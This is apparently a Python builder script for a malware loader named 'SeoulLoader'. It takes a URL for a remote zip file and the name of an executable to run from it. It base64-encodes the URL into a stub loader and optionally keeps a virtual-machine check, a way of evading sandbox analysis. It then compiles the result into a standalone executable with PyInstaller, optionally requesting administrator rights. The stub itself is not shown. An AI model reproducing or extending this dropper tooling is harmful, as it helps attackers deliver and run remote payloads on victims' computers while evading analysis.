import os
import sys
from colorama import Fore, Style
import base64

def main():
    url = input('URL for zip file: ')
    if not url:
        print(Fore.RED + '[-] You must provide a URL.' + Style.RESET_ALL)
    
    name = input('Executable name that will be ran: ')
    if not name:
        print(Fore.RED + '[-] Executable Name is needed.' + Style.RESET_ALL)

    detectvms = input('VM Check? (y/n): ')
    detectvms = detectvms.strip().lower()
    if detectvms == 'y':
        detectvms = True
    else:
        detectvms = False

    try:
        encoded_url = base64.b64encode(url.encode()).decode()
        with open('stub/loader.py', 'r') as file:
            content = file.read()

        content = content.replace('_SEOUL_URL_', f'"{encoded_url}"')
        content = content.replace('_SEOUL_EXE_', f"{name}")
        if detectvms == True:
            pass
        else:
            content = content.replace('from vmdetect import check_vm as checkvm', '')
            content = content.replace('vmdetection = checkvm()', 'vmdetection = False')

        if not os.path.exists('dist'):
            os.mkdir('dist')

        with open('dist/built_loader.py', 'w') as out:
            out.write(content)

        print(Fore.GREEN + '[+] Loader built successfully: dist/built_loader.py' + Style.RESET_ALL)
        print(Fore.BLUE + '[*] Should the executable be with administrator privileges? (y/n): ' + Style.RESET_ALL)
        admin_choice = input().strip().lower()

        if admin_choice == 'y':
            print(Fore.BLUE + '[*] Building Executable with admin...' + Style.RESET_ALL)
            print(Fore.YELLOW + '[*] Requesting admin privileges...' + Style.RESET_ALL)
            os.system(f'pyinstaller --onefile --uac-admin dist/built_loader.py --distpath dist --name SeoulLoader')
            print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
            os.remove('dist/built_loader.py')
        else:
            print(Fore.YELLOW + '[*] No admin privileges will be requested.' + Style.RESET_ALL)
            os.system('pyinstaller --onefile dist/built_loader.py --distpath dist --name SeoulLoader')
            print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
            #os.remove('dist/built_loader.py')

    except FileNotFoundError:
        print(Fore.RED + '[-] Error: stub/loader.py not found.' + Style.RESET_ALL)
        sys.exit(1)

    except Exception as e:
        print(Fore.RED + f'[-] Error: {e}' + Style.RESET_ALL)
        sys.exit(1)

if __name__ == '__main__':
    print("Please run main.py or start.bat instead of this file directly.")